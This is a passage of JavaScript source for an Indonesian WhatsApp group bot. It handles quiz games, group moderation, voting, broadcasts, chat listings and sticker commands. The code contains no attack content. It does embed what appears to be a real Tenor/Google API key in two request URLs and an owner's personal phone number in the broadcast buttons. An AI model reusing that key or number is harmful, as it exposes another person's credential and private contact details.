                    })
                    await sleep(60000)
                    if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, hisoka.user.name, m)
                    delete tebakkalimat[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'lirik') {
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    hisoka.sendText(m.chat, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
                    tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklirik[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, hisoka.user.name, m)
                    delete tebaklirik[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'lontong') {
                    if (caklontong.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    hisoka.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, m).then(() => {
                    caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
		    caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
                    })
                    await sleep(60000)
                    if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `Waktu Habis\nJawaban:  ${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, hisoka.user.name, m)
                    delete caklontong[m.sender.split('@')[0]]
		    delete caklontong_desk[m.sender.split('@')[0]]
                    }
                }
            }
            break
            case 'kuismath': case 'math': {
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                let { genMath, modes } = require('./src/math')
                if (!text) throw `Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`
                let result = await genMath(text.toLowerCase())
                hisoka.sendText(m.chat, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
                    kuismath[m.sender.split('@')[0]] = result.jawaban
                })
                await sleep(result.waktu)
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    m.reply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
                    delete kuismath[m.sender.split('@')[0]]
                }
            }
            break
            case 'jodohku': {
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `👫Jodoh mu adalah

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
            let ments = [me, jodoh]
            let buttons = [
                        { buttonId: 'jodohku', buttonText: { displayText: 'Jodohku' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(m.chat, buttons, jawab, hisoka.user.name, m, {mentions: ments})
            }
            break
            case 'jadian': {
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `Ciee yang Jadian💖 Jangan lupa pajak jadiannya🐤

@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
            let menst = [orang, jodoh]
            let buttons = [
                        { buttonId: 'jadian', buttonText: { displayText: 'Jodohku' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(m.chat, buttons, jawab, hisoka.user.name, m, {mentions: menst})
            }
            break
            case 'react': {
                if (!isCreator) return
                reactionMessage = {
                    react: {
                        text: args[0],
                        key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
                    }
                }
                hisoka.sendMessage(m.chat, reactionMessage)
            }
            break  
            case 'join': {
                if (!isCreator) return
                if (!text) throw 'Masukkan Link Group!'
                if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
                m.reply(mess.wait)
                let result = args[0].split('https://chat.whatsapp.com/')[1]
                await hisoka.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case 'leave': {
                if (!isCreator) return
                await hisoka.groupLeave(m.chat).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case 'setexif': {
               if (!isCreator) return
               if (!text) throw `Example : ${prefix + command} packname|author`
          global.packname = text.split("|")[0]
          global.author = text.split("|")[1]
          m.reply(`Exif berhasil diubah menjadi\n\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Packname : ${global.packname}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Author : ${global.author}`)
            }
            break
	case 'kick': {
	if (!isCreator) return
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await hisoka.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'add': {
	if (!isCreator) return
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await hisoka.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'promote': {
	if (!isCreator) return
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await hisoka.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'demote': {
	    if (!isCreator) return
		if (!m.isGroup) throw mess.group
        if (!isBotAdmins) throw mess.botAdmin
        if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await hisoka.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
        case 'block': {
		if (!isCreator) return
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await hisoka.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
        case 'unblock': {
		if (!isCreator) return
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await hisoka.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	    case 'setname': case 'setsubject': {
	    if (!isCreator) return
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Text ?'
                await hisoka.groupUpdateSubject(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
            }
            break
          case 'setdesc': case 'setdesk': {
          if (!isCreator) return
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Text ?'
                await hisoka.groupUpdateDescription(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
            }
            break
          case 'setppbot': {
                if (!isCreator) return
                if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                let media = await hisoka.downloadAndSaveMediaMessage(quoted)
                await hisoka.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
                m.reply(mess.success)
                }
                break
           case 'setppgroup': case 'setppgrup': case 'setppgc': {
                if (!isCreator) return
                if (!m.isGroup) throw mess.group
                if (!isAdmins) throw mess.admin
                if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                let media = await hisoka.downloadAndSaveMediaMessage(quoted)
                await hisoka.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
                m.reply(mess.success)
                }
                break
            case 'tagall': {
                if (!isCreator) return
                if (!m.isGroup) throw mess.group
                
let teks = `══✪〘 👥 Tag All 〙✪══
 •━════〘𝟱𝟬𝟱〙════━• \nINFO: ${q ? q : 'kosong'}\n •━════〘𝟱𝟬𝟱〙════━• \n`
                for (let mem of participants) {
                teks += `╭━═════════════━• \n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ @${mem.id.split('@')[0]}\n╰━═════════════━•\n •━════〘𝟱𝟬𝟱〙════━• `
                }
                hisoka.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
                }
                break
                case 'hidetag': {
                if (!isCreator) return
            if (!m.isGroup) throw mess.group
            hisoka.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
            }
            break
	    case 'style': case 'styletext': {
	        if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
		db.data.users[m.sender].limit -= 1 // -1 limit
		let { styletext } = require('./lib/scraper')
		if (!text) throw 'Masukkan Query text!'
                let anu = await styletext(text)
                let teks = `Srtle Text From ${text}\n\n`
                for (let i of anu) {
                    teks += `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *${i.name}* : ${i.result}\n\n`
                }
                m.reply(teks)
	    }
	    break
               case 'vote': {
            if (!m.isGroup) throw mess.group
            if (m.chat in vote) throw `_Masih ada vote di chat ini!_\n\n*${prefix}hapusvote* - untuk menghapus vote`
            if (!text) throw `Masukkan Alasan Melakukan Vote, Example: *${prefix + command} Owner Ganteng*`
            m.reply(`Vote dimulai!\n\n*${prefix}upvote* - untuk ya\n*${prefix}devote* - untuk tidak\n*${prefix}cekvote* - untuk mengecek vote\n*${prefix}hapusvote* - untuk menghapus vote`)
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
│
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
│
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
let buttonsVote = [
  {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
  {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
]

            let buttonMessageVote = {
                text: teks_vote,
                footer: hisoka.user.name,
                buttons: buttonsVote,
                headerType: 1
            }
            hisoka.sendMessage(m.chat, buttonMessageVote)
	    }
            break
               case 'upvote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) throw 'Kamu Sudah Vote'
            vote[m.chat][1].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
            let buttonsUpvote = [
              {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
              {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
            ]

            let buttonMessageUpvote = {
                text: teks_vote,
                footer: hisoka.user.name,
                buttons: buttonsUpvote,
                headerType: 1,
                mentions: menvote
             }
            hisoka.sendMessage(m.chat, buttonMessageUpvote)
	    }
             break
                case 'devote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) throw 'Kamu Sudah Vote'
            vote[m.chat][2].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
            let buttonsDevote = [
              {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
              {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
            ]

            let buttonMessageDevote = {
                text: teks_vote,
                footer: hisoka.user.name,
                buttons: buttonsDevote,
                headerType: 1,
                mentions: menvote
            }
            hisoka.sendMessage(m.chat, buttonMessageDevote)
	}
            break
                 
case 'cekvote':
if (!m.isGroup) throw mess.group
if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote


©${hisoka.user.id}
`
hisoka.sendTextWithMentions(m.chat, teks_vote, m)
break
		case 'deletevote': case'delvote': case 'hapusvote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
            delete vote[m.chat]
            m.reply('Berhasil Menghapus Sesi Vote Di Grup Ini')
	    }
            break
               case 'group': case 'grup': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (args[0] === 'close'){
                    await hisoka.groupSettingUpdate(m.chat, 'announcement').then((res) => m.reply(`Sukses Menutup Group`)).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'open'){
                    await hisoka.groupSettingUpdate(m.chat, 'not_announcement').then((res) => m.reply(`Sukses Membuka Group`)).catch((err) => m.reply(jsonformat(err)))
                } else {
                let buttons = [
                        { buttonId: 'group open', buttonText: { displayText: 'Open' }, type: 1 },
                        { buttonId: 'group close', buttonText: { displayText: 'Close' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(m.chat, buttons, `Mode Group`, hisoka.user.name, m)

             }
            }
            break
            case 'editinfo': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
             if (args[0] === 'open'){
                await hisoka.groupSettingUpdate(m.chat, 'unlocked').then((res) => m.reply(`Sukses Membuka Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
             } else if (args[0] === 'close'){
                await hisoka.groupSettingUpdate(m.chat, 'locked').then((res) => m.reply(`Sukses Menutup Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
             } else {
             let buttons = [
                        { buttonId: 'editinfo open', buttonText: { displayText: 'Open' }, type: 1 },
                        { buttonId: 'editinfo close', buttonText: { displayText: 'Close' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(m.chat, buttons, `Mode Edit Info`, hisoka.user.name, m)

            }
            }
            break
            case 'antilink': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (args[0] === "on") {
                if (db.data.chats[m.chat].antilink) return m.reply(`Sudah Aktif Sebelumnya`)
                db.data.chats[m.chat].antilink = true
                m.reply(`Antilink Aktif !`)
                } else if (args[0] === "off") {
                if (!db.data.chats[m.chat].antilink) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
                db.data.chats[m.chat].antilink = false
                m.reply(`Antilink Tidak Aktif !`)
                } else {
                 let buttons = [
                        { buttonId: 'antilink on', buttonText: { displayText: 'On' }, type: 1 },
                        { buttonId: 'antilink off', buttonText: { displayText: 'Off' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(m.chat, buttons, `Mode Antilink`, hisoka.user.name, m)
                }
             }
             break
             case 'mute': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (args[0] === "on") {
                if (db.data.chats[m.chat].mute) return m.reply(`Sudah Aktif Sebelumnya`)
                db.data.chats[m.chat].mute = true
                m.reply(`${hisoka.user.name} telah di mute di group ini !`)
                } else if (args[0] === "off") {
                if (!db.data.chats[m.chat].mute) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
                db.data.chats[m.chat].mute = false
                m.reply(`${hisoka.user.name} telah di unmute di group ini !`)
                } else {
                 let buttons = [
                        { buttonId: 'mute on', buttonText: { displayText: 'On' }, type: 1 },
                        { buttonId: 'mute off', buttonText: { displayText: 'Off' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(m.chat, buttons, `Mute Bot`, hisoka.user.name, m)
                }
             }
             break
            case 'linkgroup': case 'linkgc': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                let response = await hisoka.groupInviteCode(m.chat)
                hisoka.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
            }
            break
            case 'ephemeral': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Masukkan value enable/disable'
                if (args[0] === 'enable') {
                    await hisoka.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'disable') {
                    await hisoka.sendMessage(m.chat, { disappearingMessagesInChat: false }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                }
            }
            break
            case 'delete': case 'del': {
                if (!m.quoted) throw false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
                hisoka.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
            case 'bcgc': case 'bcgroup': {
                if (!isCreator) return
                if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
                let getGroups = await hisoka.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                m.reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
                for (let i of anu) {
                    await sleep(1500)
                    let btn = [{
                                urlButton: {
                                    displayText: 'Source Code',
                                    url: 'https://github.com/DikaArdnt/Hisoka-Morou'
                                }
                            }, {
                                callButton: {
                                    displayText: 'Number Phone Owner',
                                    phoneNumber: '+62 882-9202-4190'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Status Bot',
                                    id: 'ping'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Contact Owner',
                                    id: 'owner'
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: 'Script',
                                    id: 'sc'
                                }
                            }]
                      let txt = `「 Broadcast Bot 」\n\n${text}`
                      hisoka.send5ButImg(i, txt, hisoka.user.name, global.thumb, btn)
                    }
                m.reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
            }
            break
            case 'bc': case 'broadcast': case 'bcall': {
                if (!isCreator) return
                if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
                let anu = await store.chats.all().map(v => v.id)
                m.reply(`Mengirim Broadcast Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * 1.5} detik`)
		for (let yoi of anu) {
		    await sleep(1500)
		    let btn = [{
                                urlButton: {
                                    displayText: 'Source Code',
                                    url: 'https://github.com/DikaArdnt/Hisoka-Morou'
                                }
                            }, {
                                callButton: {
                                    displayText: 'Number Phone Owner',
                                    phoneNumber: '+62 882-9202-4190'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Status Bot',
                                    id: 'ping'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Contact Owner',
                                    id: 'owner'
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: 'Script',
                                    id: 'sc'
                                }
                            }]
                      let txt = `「 Broadcast Bot 」\n\n${text}`
                      hisoka.send5ButImg(yoi, txt, hisoka.user.name, global.thumb, btn)
		}
		m.reply('Sukses Broadcast')
            }
            break
            case 'infochat': {
                if (!m.quoted) m.reply('Reply Pesan')
                let msg = await m.getQuotedObj()
                if (!m.quoted.isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
                let teks = ''
                for (let i of msg.userReceipt) {
                    let read = i.readTimestamp
                    let unread = i.receiptTimestamp
                    let waktu = read ? read : unread
                    teks += `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ @${i.userJid.split('@')[0]}\n`
                    teks += ` ┗━│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Waktu :* ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')} │⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Status :* ${read ? 'Dibaca' : 'Terkirim'}\n\n`
                }
                hisoka.sendTextWithMentions(m.chat, teks, m)
            }
            break
            case 'q': case 'quoted': {
		if (!m.quoted) return m.reply('Reply Pesannya!!')
		let wokwol = await hisoka.serializeM(await m.getQuotedObj())
		if (!wokwol.quoted) return m.reply('Pesan Yang anda reply tidak mengandung reply')
		await wokwol.quoted.copyNForward(m.chat, true)
            }
	    break
            case 'listpc': {
                 let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                 let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
                 for (let i of anu) {
                     let nama = store.messages[i].array[0].pushName
                     teks += `⬡ *Nama :* ${nama}\n⬡ *User :* @${i.split('@')[0]}\n⬡ *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
                 }
                 hisoka.sendTextWithMentions(m.chat, teks, m)
             }
             break
                case 'listgc': {
                 let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                 let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
                 for (let i of anu) {
                     let metadata = await hisoka.groupMetadata(i)
                     teks += `⬡ *Nama :* ${metadata.subject}\n⬡ *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Tidak diketahui'}\n⬡ *ID :* ${metadata.id}\n⬡ *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n⬡ *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
                 }
                 hisoka.sendTextWithMentions(m.chat, teks, m)
             }
             break
             case 'listonline': case 'liston': {
                    let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
                    let online = [...Object.keys(store.presences[id]), botNumber]
                    hisoka.sendText(m.chat, 'List Online:\n\n' + online.map(v => '│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
             }
             break
            case 'sticker': case 's': case 'stickergif': case 'sgif': {
            if (!isCreator) return
            if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
            m.reply(mess.wait)
                    if (/image/.test(mime)) {
                let media = await quoted.download()
                let encmedia = await hisoka.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
                let media = await quoted.download()
                let encmedia = await hisoka.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else {
                throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
                }
            }
            break
            case 'ebinary': {
            if (!text) throw `Example : ${prefix + command} text`
            let { eBinary } = require('./lib/binary')
            let eb = await eBinary(text)
            m.reply(eb)
        }
        break
            case 'dbinary': {
            if (!text) throw `Example : ${prefix + command} text`
            let { dBinary } = require('./lib/binary')
            let db = await dBinary(text)
            m.reply(db)
        }
        break
            case 'emojimix': {
            if (!isCreator) return
		let [emoji1, emoji2] = text.split`+`
		if (!emoji1) throw `Example : ${prefix + command} 😅+🤔`
		if (!emoji2) throw `Example : ${prefix + command} 😅+🤔`
		let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anu.results) {
		    let encmedia = await hisoka.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break
	    case 'emojimix2': {
	    if (!isCreator) return
	    if (!text) throw `Example : ${prefix + command} 😅`
		let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
		for (let res of anu.results) {
		    let encmedia = await hisoka.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break
	       case 'attp': case 'ttp': {
	       if (!isCreator) return
           if (!text) throw `Example : ${prefix + command} text`
           await hisoka.sendMedia(m.chat, `https://xteam.xyz/${command}?file&text=${text}`, 'hisoka', 'morou', m, {asSticker: true})

         }
         break
	       case 'smeme': case 'stickmeme': case 'stikmeme': case 'stickermeme': case 'stikermeme': {
	       if (!isCreator) return
	        let respond = `Kirim/reply image/sticker dengan caption ${prefix + command} text1|text2`
	        if (!/image/.test(mime)) throw respond
            if (!text) throw respond
	        m.reply(mess.wait)
            atas = text.split('|')[0] ? text.split('|')[0] : '-'
            bawah = text.split('|')[1] ? text.split('|')[1] : '-'
	        let dwnld = await quoted.download()
	        let { floNime } = require('./lib/uploader')
	        let fatGans = await floNime(dwnld)
	        let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${fatGans.result.url}`
	        let FaTiH = await hisoka.sendImageAsSticker(m.chat, smeme, m, { packname: global.packname, author: global.auhor })
	        await fs.unlinkSync(FaTiH)
            }
	       break     
	        case 'simih': case 'simisimi': {
